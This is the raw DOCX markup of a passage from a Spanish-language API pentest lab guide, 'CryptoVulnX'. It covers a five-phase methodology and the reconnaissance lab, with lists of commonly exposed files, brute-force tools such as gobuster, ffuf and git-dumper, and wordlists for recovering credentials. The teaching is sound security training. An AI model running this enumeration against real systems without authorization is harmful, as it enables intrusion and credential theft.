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C3E50"/>
          <w:sz w:val="96"/>
        </w:rPr>
        <w:t>CryptoVulnX</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:sz w:val="40"/>
        </w:rPr>
        <w:t>Laboratorio completo de pentest de APIs</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>Resolucion paso a paso de los 14 LABs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="555555"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Metodologia 5 fases + OWASP API Security Top 10 (2023)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="888888"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Documento educativo - uso exclusivo en entornos aislados</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Indice</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Este documento contiene los 14 LABs de CryptoVulnX en su orden metodologico. Los LABs 11-14 introducen las fases de descubrimiento (RECON, INVENTORY, ENDPOINT FUZZING, PARAMETER FUZZING). Los LABs 01-10 cubren la fase de explotacion contra el OWASP API Security Top 10 (2023).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Fase 1 - Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB11-RECON</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Fase 2 - Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB12-API-INVENTORY-FUZZING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Fase 3 - Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB13-ENDPOINT-FUZZING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Fase 4 - Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB14-PARAMETER-FUZZING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Fase 5 - OWASP API Top 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB01-BOLA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB02-BROKEN-AUTH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB03-BOPLA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB04-RESOURCE</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB05-BFLA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB06-BUSINESS-FLOW</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB07-SSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB08-MISCONFIG</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB09-INVENTORY</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>LAB10-UNSAFE-CONSUMPTION</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Introduccion a la metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El pentest de un API moderno NO es ejecutar SQLi contra /api/v1/login. Es un proceso ordenado de descubrimiento y explotacion donde cada fase alimenta a la siguiente. El error frecuente del alumno principiante es saltar directo a la fase 5. El pentest profesional gasta el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>70% del tiempo en fases 1-4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y solo el 30% en explotacion. Razon: si la enumeracion fue completa, la explotacion es trivial.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Las 5 fases</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fase 1 - RECON</w:t>
      </w:r>
      <w:r>
        <w:t>: Descubrir archivos publicos: robots.txt, .git/, .env*, backups, notes, dumps SQL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fase 2 - API INVENTORY</w:t>
      </w:r>
      <w:r>
        <w:t>: Mapear todas las versiones del API: v1, v2, v3, internal, test, dev, staging. Buscar swagger.json y openapi.json.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fase 3 - ENDPOINT FUZZING</w:t>
      </w:r>
      <w:r>
        <w:t>: Brute paths bajo cada version. Verb fuzzing. Hallazgos tipicos: admin/exec, admin/backup, internal/health.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fase 4 - PARAMETER FUZZING</w:t>
      </w:r>
      <w:r>
        <w:t>: Descubrir query params, body params, headers y cookies no documentados que cambian comportamiento.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fase 5 - EXPLOITATION</w:t>
      </w:r>
      <w:r>
        <w:t>: Combinar todo lo descubierto en fases 1-4 para ejecutar chains de OWASP API Top 10.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Como leer cada LAB</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cada LAB tiene la misma estructura: Objetivo, Contexto, Endpoints involucrados, Dificultad, Pistas, Solucion paso a paso, Remediacion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Los bloques de codigo (Consolas, fondo gris) son comandos listos para copiar/pegar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Los recuadros 'Pista N' son guias progresivas: empezar por la primera y avanzar solo si te trabas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>La seccion 'Solucion' es la respuesta. No leerla antes de intentar la fase.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>La seccion 'Remediacion' muestra el codigo correcto - util como referencia para el equipo de desarrollo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Fase 1 - Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 11 - Reconocimiento y Archivos Expuestos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Fase de la Metodologia: 1 - RECON</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Aplicar la primera fase del pentest de API: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>enumeracion de archivos y rutas estaticas expuestas accidentalmente</w:t>
      </w:r>
      <w:r>
        <w:t>. El alumno debe descubrir backups, archivos de configuracion, restos de control de versiones y notas internas que le permitan reconstruir credenciales y mapear los siguientes pasos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Esta es la fase </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mas barata</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> del pentest (puramente HTTP GET) y la que mas pistas da para las fases 2 a 5.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Los equipos de desarrollo dejan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rastros</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en el docroot que un atacante recupera con peticiones HTTP simples:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Archivos de control de versiones (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.git/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.svn/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.hg/</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Backups con extension </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.bak</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.old</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.swp</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>~</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.orig</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dumps de base de datos (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.sql</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.sql.gz</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>backup/</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Archivos de IDE/SO (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.DS_Store</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.vscode/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.idea/</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Archivos de notas (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>notes.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>TODO.md</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>README.local</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Archivos de dependencias (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>composer.json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>composer.lock</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>package.json</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>yarn.lock</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Archivos de debug (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>phpinfo.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>info.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>test.php</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Paneles administrativos olvidados (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>adminer.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>phpmyadmin/</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Archivos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>.well-known/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que paradojicamente revelan rutas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Herramientas Recomendadas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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Herramienta</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Uso</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>gobuster dir</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Bruteforce de directorios y archivos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>ffuf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Fuzzing rapido con wordlists grandes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>feroxbuster</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Bruteforce recursivo</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>dirsearch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Especializado en archivos web</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>nuclei -t exposures/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Templates de exposicion conocidos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>git-dumper</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Recupera codigo desde </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>.git/</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> expuesto</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>wget --mirror</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Mirror del sitio para grep posterior</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>curl</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>for</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Scripts ad-hoc</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Wordlists Recomendados</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>SecLists/Discovery/Web-Content/raft-medium-files.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/raft-medium-directories.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/quickhits.txt</w:t>
        <w:br/>
        <w:t>SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt   (descartar WP)</w:t>
        <w:br/>
        <w:t>wordlists/cryptovulnx-custom.txt                          (incluido en este lab)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Hallazgos esperados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Ruta</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
